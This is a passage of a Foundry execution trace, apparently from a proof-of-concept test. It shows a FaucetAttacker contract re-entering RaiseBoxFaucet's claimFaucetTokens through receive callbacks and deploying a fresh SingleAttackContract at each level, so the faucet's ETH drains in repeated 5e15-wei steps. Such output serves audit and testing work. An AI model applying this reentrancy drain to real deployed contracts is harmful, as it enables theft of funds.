    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 930000000000000000 [9.3e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xD698c56bC23C35681D09F2195EC4bEaf0c832540
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 14) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [21684757] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [21683998] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [21647830] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [21640172] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 925000000000000000 [9.25e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xB30195Ce0645B843C6FBe1Ec539e5b7AbC80bb55
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 15) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [21382788] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [21382029] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [21345861] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [21338203] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 920000000000000000 [9.2e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xf6f3327C535aE7214865eE5Df3B48d5735638e84
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 16) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [21080819] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [21080060] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [21043892] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [21036234] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 915000000000000000 [9.15e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x14b8eCFBabffc57f6B5e89934aa81C0ea15e2FbB
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 17) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [20778850] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [20778091] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [20741923] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [20734265] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 910000000000000000 [9.1e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x329FDC88D632ba7993cF87020718387aE754f3F2
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 18) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [20476881] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [20476122] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [20439954] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [20432296] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 905000000000000000 [9.05e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x37C6043632c2b8b2D54e4C326E9d0767D715c6C9
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 19) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [20174912] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [20174153] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [20137985] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [20130327] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 900000000000000000 [9e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x4B6f3c5118a76A1C88F5351403bF8972C6445906
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 20) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [19872943] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [19872184] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [19836016] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [19828358] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 895000000000000000 [8.95e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xBAD59176f6B2c4567d0B6D931b9aDBfCDF2721B3
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
